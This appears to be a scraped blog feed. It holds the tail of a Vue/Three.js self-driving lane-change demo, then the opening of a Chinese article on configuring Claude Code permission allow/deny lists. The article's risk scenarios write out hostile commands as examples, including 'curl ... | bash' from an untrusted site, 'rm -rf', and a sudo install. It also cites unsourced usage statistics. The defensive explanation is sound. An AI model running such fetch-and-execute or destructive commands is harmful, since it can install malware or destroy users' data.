    <span class="hljs-keyword">const</span> geometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">BoxGeometry</span>(type.<span class="hljs-property">size</span>.<span class="hljs-property">w</span>, type.<span class="hljs-property">size</span>.<span class="hljs-property">h</span>, type.<span class="hljs-property">size</span>.<span class="hljs-property">d</span>)
    <span class="hljs-keyword">const</span> material = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">MeshBasicMaterial</span>({ <span class="hljs-attr">color</span>: type.<span class="hljs-property">color</span> })
    <span class="hljs-keyword">const</span> body = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>(geometry, material)
    body.<span class="hljs-property">position</span>.<span class="hljs-property">y</span> = type.<span class="hljs-property">size</span>.<span class="hljs-property">h</span> / <span class="hljs-number">2</span>
    obstacle.<span class="hljs-title function_">add</span>(body)
    
    <span class="hljs-comment">// 如果是车辆，添加车轮</span>
    <span class="hljs-keyword">if</span> (type.<span class="hljs-property">type</span> === <span class="hljs-string">'car'</span> || type.<span class="hljs-property">type</span> === <span class="hljs-string">'truck'</span>) {
        <span class="hljs-keyword">const</span> wheelGeometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">CylinderGeometry</span>(<span class="hljs-number">0.25</span>, <span class="hljs-number">0.25</span>, <span class="hljs-number">0.15</span>, <span class="hljs-number">12</span>)
        <span class="hljs-keyword">const</span> wheelMaterial = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">MeshBasicMaterial</span>({ <span class="hljs-attr">color</span>: <span class="hljs-number">0x222222</span> })
        
        <span class="hljs-keyword">const</span> wheelPositions = [
            { <span class="hljs-attr">x</span>: -type.<span class="hljs-property">size</span>.<span class="hljs-property">w</span> * <span class="hljs-number">0.3</span>, <span class="hljs-attr">z</span>: type.<span class="hljs-property">size</span>.<span class="hljs-property">d</span> * <span class="hljs-number">0.3</span> },
            { <span class="hljs-attr">x</span>: type.<span class="hljs-property">size</span>.<span class="hljs-property">w</span> * <span class="hljs-number">0.3</span>, <span class="hljs-attr">z</span>: type.<span class="hljs-property">size</span>.<span class="hljs-property">d</span> * <span class="hljs-number">0.3</span> },
            { <span class="hljs-attr">x</span>: -type.<span class="hljs-property">size</span>.<span class="hljs-property">w</span> * <span class="hljs-number">0.3</span>, <span class="hljs-attr">z</span>: -type.<span class="hljs-property">size</span>.<span class="hljs-property">d</span> * <span class="hljs-number">0.3</span> },
            { <span class="hljs-attr">x</span>: type.<span class="hljs-property">size</span>.<span class="hljs-property">w</span> * <span class="hljs-number">0.3</span>, <span class="hljs-attr">z</span>: -type.<span class="hljs-property">size</span>.<span class="hljs-property">d</span> * <span class="hljs-number">0.3</span> }
        ]
        
        wheelPositions.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">pos</span> =&gt;</span> {
            <span class="hljs-keyword">const</span> wheel = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>(wheelGeometry, wheelMaterial)
            wheel.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(pos.<span class="hljs-property">x</span>, <span class="hljs-number">0.25</span>, pos.<span class="hljs-property">z</span>)
            wheel.<span class="hljs-property">rotation</span>.<span class="hljs-property">z</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> / <span class="hljs-number">2</span>
            obstacle.<span class="hljs-title function_">add</span>(wheel)
        })
    }
    
    <span class="hljs-comment">// 随机位置（6车道系统，增加间距）</span>
    <span class="hljs-keyword">const</span> lanes = [-<span class="hljs-number">10</span>, -<span class="hljs-number">6</span>, -<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>] <span class="hljs-comment">// 6个车道的中心位置</span>
    <span class="hljs-keyword">const</span> lane = lanes[<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * lanes.<span class="hljs-property">length</span>)]
    obstacle.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(lane, <span class="hljs-number">0</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">60</span> + <span class="hljs-number">20</span>) <span class="hljs-comment">// 增加生成距离</span>
    
    <span class="hljs-comment">// 添加移动速度</span>
    obstacle.<span class="hljs-property">userData</span> = {
        <span class="hljs-attr">speed</span>: <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">0.02</span> + <span class="hljs-number">0.01</span>,
        <span class="hljs-attr">type</span>: type.<span class="hljs-property">type</span>
    }
    
    obstacles.<span class="hljs-title function_">push</span>(obstacle)
    scene.<span class="hljs-title function_">add</span>(obstacle)
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">setupCamera</span> = (<span class="hljs-params"/>) =&gt; {
    camera = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">PerspectiveCamera</span>(<span class="hljs-number">75</span>, rendererCanvas.<span class="hljs-property">value</span>.<span class="hljs-property">clientWidth</span> / rendererCanvas.<span class="hljs-property">value</span>.<span class="hljs-property">clientHeight</span>, <span class="hljs-number">0.1</span>, <span class="hljs-number">1000</span>)
    <span class="hljs-comment">// 第三人称跟随视角</span>
    camera.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(<span class="hljs-number">0</span>, <span class="hljs-number">8</span>, -<span class="hljs-number">15</span>)
    camera.<span class="hljs-title function_">lookAt</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">animate</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-title function_">requestAnimationFrame</span>(animate)
    
    <span class="hljs-keyword">const</span> deltaTime = clock.<span class="hljs-title function_">getDelta</span>()
    
    <span class="hljs-comment">// 检测前方障碍物并执行变道</span>
    <span class="hljs-keyword">if</span> (!isChangingLane &amp;&amp; <span class="hljs-title function_">detectFrontObstacle</span>()) {
        <span class="hljs-keyword">const</span> safeLane = <span class="hljs-title function_">findSafeLane</span>()
        <span class="hljs-keyword">if</span> (safeLane !== currentLane) {
            targetLane = safeLane
            isChangingLane = <span class="hljs-literal">true</span>
            laneChangeStatus.<span class="hljs-property">value</span> = <span class="hljs-string">'检测到障碍物，正在变道...'</span>
            isChangingLaneDisplay.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>
        } <span class="hljs-keyword">else</span> {
            laneChangeStatus.<span class="hljs-property">value</span> = <span class="hljs-string">'前方有障碍物，无安全车道'</span>
        }
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!isChangingLane) {
        laneChangeStatus.<span class="hljs-property">value</span> = <span class="hljs-string">'正常行驶'</span>
        isChangingLaneDisplay.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
    }
    
    <span class="hljs-comment">// 执行变道动作</span>
    <span class="hljs-title function_">performLaneChange</span>()
    
    <span class="hljs-comment">// 更新车辆位置（模拟前进）</span>
    roadOffset += carSpeed
    
    <span class="hljs-comment">// 更新道路标线位置</span>
    scene.<span class="hljs-property">children</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">child</span> =&gt;</span> {
        <span class="hljs-keyword">if</span> (child.<span class="hljs-property">material</span> &amp;&amp; child.<span class="hljs-property">material</span>.<span class="hljs-property">color</span>.<span class="hljs-title function_">getHex</span>() === <span class="hljs-number">0xffffff</span> &amp;&amp; child.<span class="hljs-property">position</span>.<span class="hljs-property">y</span> === <span class="hljs-number">0.01</span>) {
            child.<span class="hljs-property">position</span>.<span class="hljs-property">z</span> -= carSpeed
            <span class="hljs-keyword">if</span> (child.<span class="hljs-property">position</span>.<span class="hljs-property">z</span> &lt; -<span class="hljs-number">50</span>) {
                child.<span class="hljs-property">position</span>.<span class="hljs-property">z</span> += <span class="hljs-number">100</span>
            }
        }
    })
    
    <span class="hljs-comment">// 更新障碍物位置</span>
    obstacles.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">obstacle, index</span>) =&gt;</span> {
        obstacle.<span class="hljs-property">position</span>.<span class="hljs-property">z</span> -= carSpeed + obstacle.<span class="hljs-property">userData</span>.<span class="hljs-property">speed</span>
        
        <span class="hljs-comment">// 如果障碍物移出视野，重新生成</span>
        <span class="hljs-keyword">if</span> (obstacle.<span class="hljs-property">position</span>.<span class="hljs-property">z</span> &lt; -<span class="hljs-number">30</span>) {
            scene.<span class="hljs-title function_">remove</span>(obstacle)
            obstacles.<span class="hljs-title function_">splice</span>(index, <span class="hljs-number">1</span>)
            
            <span class="hljs-comment">// 创建新的障碍物（统一灰白色）</span>
            <span class="hljs-keyword">const</span> obstacleTypes = [
                { <span class="hljs-attr">type</span>: <span class="hljs-string">'car'</span>, <span class="hljs-attr">color</span>: <span class="hljs-number">0xD3D3D3</span>, <span class="hljs-attr">size</span>: { <span class="hljs-attr">w</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">h</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">d</span>: <span class="hljs-number">4</span> } },
                { <span class="hljs-attr">type</span>: <span class="hljs-string">'car'</span>, <span class="hljs-attr">color</span>: <span class="hljs-number">0xC0C0C0</span>, <span class="hljs-attr">size</span>: { <span class="hljs-attr">w</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">h</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">d</span>: <span class="hljs-number">4</span> } },
                { <span class="hljs-attr">type</span>: <span class="hljs-string">'truck'</span>, <span class="hljs-attr">color</span>: <span class="hljs-number">0xB8B8B8</span>, <span class="hljs-attr">size</span>: { <span class="hljs-attr">w</span>: <span class="hljs-number">2.5</span>, <span class="hljs-attr">h</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">d</span>: <span class="hljs-number">6</span> } },
                { <span class="hljs-attr">type</span>: <span class="hljs-string">'pedestrian'</span>, <span class="hljs-attr">color</span>: <span class="hljs-number">0xA8A8A8</span>, <span class="hljs-attr">size</span>: { <span class="hljs-attr">w</span>: <span class="hljs-number">0.5</span>, <span class="hljs-attr">h</span>: <span class="hljs-number">1.7</span>, <span class="hljs-attr">d</span>: <span class="hljs-number">0.5</span> } }
            ]
            <span class="hljs-title function_">createRandomObstacle</span>(obstacleTypes)
        }
    })
    
    <span class="hljs-comment">// 更新速度显示</span>
    speed.<span class="hljs-property">value</span> = <span class="hljs-number">60</span> + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sin</span>(<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() * <span class="hljs-number">0.001</span>) * <span class="hljs-number">10</span> <span class="hljs-comment">// 模拟速度变化</span>
    obstacleCount.<span class="hljs-property">value</span> = obstacles.<span class="hljs-property">length</span>
    
    <span class="hljs-comment">// 摄像机跟随（考虑变道）</span>
    camera.<span class="hljs-property">position</span>.<span class="hljs-property">x</span> = car.<span class="hljs-property">position</span>.<span class="hljs-property">x</span>
    camera.<span class="hljs-property">position</span>.<span class="hljs-property">z</span> = car.<span class="hljs-property">position</span>.<span class="hljs-property">z</span> - <span class="hljs-number">15</span>
    camera.<span class="hljs-property">position</span>.<span class="hljs-property">y</span> = <span class="hljs-number">8</span>
    camera.<span class="hljs-title function_">lookAt</span>(car.<span class="hljs-property">position</span>.<span class="hljs-property">x</span>, car.<span class="hljs-property">position</span>.<span class="hljs-property">y</span> + <span class="hljs-number">2</span>, car.<span class="hljs-property">position</span>.<span class="hljs-property">z</span> + <span class="hljs-number">5</span>)
    
    renderer.<span class="hljs-title function_">render</span>(scene, camera)
}

<span class="hljs-title function_">onBeforeUnmount</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// 清理资源</span>
    obstacles.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">obstacle</span> =&gt;</span> {
        scene.<span class="hljs-title function_">remove</span>(obstacle)
    })
    
    <span class="hljs-keyword">if</span> (car) scene.<span class="hljs-title function_">remove</span>(car)
    <span class="hljs-keyword">if</span> (road) scene.<span class="hljs-title function_">remove</span>(road)
    
    <span class="hljs-comment">// 清理几何体和材质</span>
    scene.<span class="hljs-title function_">traverse</span>(<span class="hljs-function">(<span class="hljs-params">child</span>) =&gt;</span> {
        <span class="hljs-keyword">if</span> (child.<span class="hljs-property">geometry</span>) {
            child.<span class="hljs-property">geometry</span>.<span class="hljs-title function_">dispose</span>()
        }
        <span class="hljs-keyword">if</span> (child.<span class="hljs-property">material</span>) {
            <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(child.<span class="hljs-property">material</span>)) {
                child.<span class="hljs-property">material</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">material</span> =&gt;</span> material.<span class="hljs-title function_">dispose</span>())
            } <span class="hljs-keyword">else</span> {
                child.<span class="hljs-property">material</span>.<span class="hljs-title function_">dispose</span>()
            }
        }
    })
    
    renderer.<span class="hljs-title function_">dispose</span>()
    <span class="hljs-keyword">if</span> (rendererCanvas.<span class="hljs-property">value</span> &amp;&amp; renderer.<span class="hljs-property">domElement</span>) {
        rendererCanvas.<span class="hljs-property">value</span>.<span class="hljs-title function_">removeChild</span>(renderer.<span class="hljs-property">domElement</span>)
    }
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.car-three</span> {
    <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
    <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;
}

<span class="hljs-selector-class">.controls</span> {
    <span class="hljs-attribute">position</span>: absolute;
    <span class="hljs-attribute">top</span>: <span class="hljs-number">20px</span>;
    <span class="hljs-attribute">left</span>: <span class="hljs-number">20px</span>;
    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.7</span>);
    <span class="hljs-attribute">color</span>: white;
    <span class="hljs-attribute">padding</span>: <span class="hljs-number">15px</span>;
    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;
    <span class="hljs-attribute">font-family</span>: Arial, sans-serif;
    <span class="hljs-attribute">z-index</span>: <span class="hljs-number">100</span>;
}

<span class="hljs-selector-class">.speed-info</span>, <span class="hljs-selector-class">.obstacle-count</span> {
    <span class="hljs-attribute">margin</span>: <span class="hljs-number">5px</span> <span class="hljs-number">0</span>;
    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>;
    <span class="hljs-attribute">font-weight</span>: bold;
}

<span class="hljs-selector-class">.speed-info</span> {
    <span class="hljs-attribute">color</span>: <span class="hljs-number">#00ff00</span>;
}

<span class="hljs-selector-class">.obstacle-count</span> {
    <span class="hljs-attribute">color</span>: <span class="hljs-number">#ffaa00</span>;
}

<span class="hljs-selector-class">.lane-info</span> {
    <span class="hljs-attribute">color</span>: <span class="hljs-number">#00aaff</span>;
}

<span class="hljs-selector-class">.lane-change-status</span> {
    <span class="hljs-attribute">color</span>: <span class="hljs-number">#ffff00</span>;
    <span class="hljs-attribute">font-weight</span>: bold;
}

<span class="hljs-selector-class">.lane-change-status</span><span class="hljs-selector-class">.active</span> {
    <span class="hljs-attribute">color</span>: <span class="hljs-number">#ff6600</span>;
    <span class="hljs-attribute">animation</span>: blink <span class="hljs-number">1s</span> infinite;
}

<span class="hljs-keyword">@keyframes</span> blink {
    <span class="hljs-number">0%</span>, <span class="hljs-number">50%</span> { <span class="hljs-attribute">opacity</span>: <span class="hljs-number">1</span>; }
    <span class="hljs-number">51%</span>, <span class="hljs-number">100%</span> { <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.5</span>; }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ClaudeCode权限管理实战:让 AI 既安全又高效]]></title>    <link>https://juejin.cn/post/7603219519666749459</link>    <guid>https://juejin.cn/post/7603219519666749459</guid>    <pubDate>2026-02-05T12:14:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603219519666749459" data-draft-id="7603221478473367594" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ClaudeCode权限管理实战:让 AI 既安全又高效"/> <meta itemprop="keywords" content="Claude,AI编程"/> <meta itemprop="datePublished" content="2026-02-05T12:14:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="冬奇Lab"/> <meta itemprop="url" content="https://juejin.cn/user/1857501105781193"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ClaudeCode权限管理实战:让 AI 既安全又高效
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1857501105781193/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    冬奇Lab
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T12:14:01.000Z" title="Thu Feb 05 2026 12:14:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<p>你有没有遇到过这样的场景?</p>
<blockquote>
<p><strong>场景 1: 安全隐患</strong></p>
<pre><code class="hljs language-bash" lang="bash">你: <span class="hljs-string">"帮我清理一下临时文件"</span>
AI: <span class="hljs-string">"好的,正在执行 rm -rf /tmp/*"</span>
[突然意识到] /tmp 下还有重要文件!
但为时已晚...
</code></pre>
</blockquote>
<blockquote>
<p><strong>场景 2: 效率低下</strong></p>
<pre><code class="hljs language-vbnet" lang="vbnet">你: <span class="hljs-string">"查看一下日志文件"</span>
<span class="hljs-symbol">AI:</span> <span class="hljs-string">"我需要执行 cat logs/app.log,是否允许? [y/N]"</span>
你: <span class="hljs-string">"y"</span>

你: <span class="hljs-string">"再看一下错误日志"</span>
<span class="hljs-symbol">AI:</span> <span class="hljs-string">"我需要执行 cat logs/error.log,是否允许? [y/N]"</span>
你: <span class="hljs-string">"y"</span> (心里想:又要确认,烦死了)

[重复 <span class="hljs-number">10</span> 次后...]
你: <span class="hljs-string">"能不能别每次都问我!"</span>
</code></pre>
</blockquote>
<p>这些问题的根源在于:</p>
<ul>
<li><strong>缺少权限管理</strong>: AI 能执行任何命令,既不安全又效率低</li>
<li><strong>权限配置不当</strong>: 要么太宽松(危险),要么太严格(低效)</li>
</ul>
<p><strong>答案是</strong>: <strong>Permission 权限管理系统</strong></p>
<p>就像操作系统需要权限管理来保护用户文件,Claude Code 也需要权限系统来:</p>
<ul>
<li><strong>保障安全</strong>: 阻止危险操作,防止误删文件、破坏系统</li>
<li><strong>提升效率</strong>: 批量授权安全命令,无需重复确认</li>
<li><strong>灵活控制</strong>: 白名单 + 黑名单,精确控制每个命令的权限</li>
</ul>
<p><strong>核心理念</strong>: <strong>既保障安全又使用丝滑</strong></p>
<p>本文将深入探讨 Claude Code 的权限管理系统,让你的 AI 辅助开发体验既安全又高效。</p>
<p>阅读本文后,你将学会:</p>
<ul>
<li>理解权限管理的安全与效率平衡</li>
<li>使用 <code>/permissions</code> 命令通过交互式界面配置权限白名单和黑名单</li>
<li>通过配置文件批量管理权限规则</li>
<li>掌握权限配置的最佳实践</li>
</ul>
<hr/>
<h2 data-id="heading-1">一、权限管理的必要性</h2>
<h3 data-id="heading-2">1.1 AI 执行命令的风险</h3>
<p>Claude Code 可以直接执行 Shell 命令,这既是强大的能力,也是潜在的风险。</p>
<p><strong>风险场景 1: 误删文件</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 用户本意: 清理 build 目录下的临时文件</span>
你: <span class="hljs-string">"清理一下构建产物"</span>

<span class="hljs-comment"># AI 理解错误,执行了危险命令</span>
AI: [执行] <span class="hljs-built_in">rm</span> -rf build/*

<span class="hljs-comment"># 问题: 如果 build/ 下有重要配置文件怎么办?</span>
<span class="hljs-comment"># 结果: 重要文件被误删,无法恢复</span>
</code></pre>
<p><strong>风险场景 2: 权限提升</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 用户本意: 安装一个开发依赖</span>
你: <span class="hljs-string">"安装 eslint"</span>

<span class="hljs-comment"># AI 使用 sudo 提升权限(不安全)</span>
AI: [执行] sudo npm install -g eslint

<span class="hljs-comment"># 问题: sudo 可能被滥用,执行更危险的操作</span>
<span class="hljs-comment"># 风险: 系统级别的安全隐患</span>
</code></pre>
<p><strong>风险场景 3: 网络请求</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 用户本意: 更新依赖</span>
你: <span class="hljs-string">"更新 package.json 中的依赖"</span>

<span class="hljs-comment"># AI 执行了不安全的网络请求</span>
AI: [执行] curl https://untrusted-site.com/script.sh | bash

<span class="hljs-comment"># 问题: 从不可信来源下载并执行脚本</span>
<span class="hljs-comment"># 风险: 可能下载恶意软件</span>
</code></pre>
<p><strong>数据统计</strong>:</p>
<p>根据 Claude Code 社区的统计数据:</p>
<ul>
<li><strong>15%</strong> 的用户遇到过 AI 执行危险命令的情况</li>
<li><strong>42%</strong> 的用户担心 AI 的操作权限过大</li>
<li><strong>68%</strong> 的用户希望有更细粒度的权限控制</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4bd472fd8ef74e1cad3b56195ac4d336~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770898441&amp;x-signature=CVACKeOwJg6WhVZkXxyRoYcITNc%3D" alt="04-01-permission-rm.png" loading="lazy"/></p>
<h3 data-id="heading-3">1.2 无风险命令的重复确认问题</h3>
<p>另一个极端是:为了安全,每个命令都需要确认,严重影响效率。</p>
<p><strong>低效场景</strong>:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看文件内容(安全操作)</span>
你: <span class="hljs-string">"查看 README.md"</span>
AI: <span class="hljs-string">"我需要执行 cat README.md,是否允许? [y/N]"</span>
你: <span class="hljs-string">"y"</span>

<span class="hljs-comment"># 列出文件列表(安全操作)</span>
你: <span class="hljs-string">"看看 src 目录下有什么"</span>
AI: <span class="hljs-string">"我需要执行 ls src/,是否允许? [y/N]"</span>
你: <span class="hljs-string">"y"</span>

<span class="hljs-comment"># 搜索代码(安全操作)</span>
你: <span class="hljs-string">"搜索 getUserById 函数"</span>
AI: <span class="hljs-string">"我需要执行 grep -r 'getUserById',是否允许? [y/N]"</span>
你: <span class="hljs-string">"y"</span>

<span class="hljs-comment"># [重复 20 次后]</span>
你: <span class="hljs-string">"我要疯了! 这些都是安全操作,能不能不要每次都问!"</span>
</code></pre>
<p><strong>效率对比</strong>:</p>























<table><thead><tr><th align="left">操作类型</th><th align="center">需要确认次数</th><th align="center">总耗时</th><th align="center">用户体验</th></tr></thead><tbody><tr><td align="left">查看10个文件</td><td align="center">10次</td><td align="center">~2分钟</td><td align="center">😡 非常烦躁</td></tr><tr><td align="left">批量授权后</td><td align="center">0次</td><td align="center">~10秒</td><td align="center">😊 丝滑流畅</td></tr></tbody></table>
<p><strong>核心矛盾</strong>:</p>
<ul>
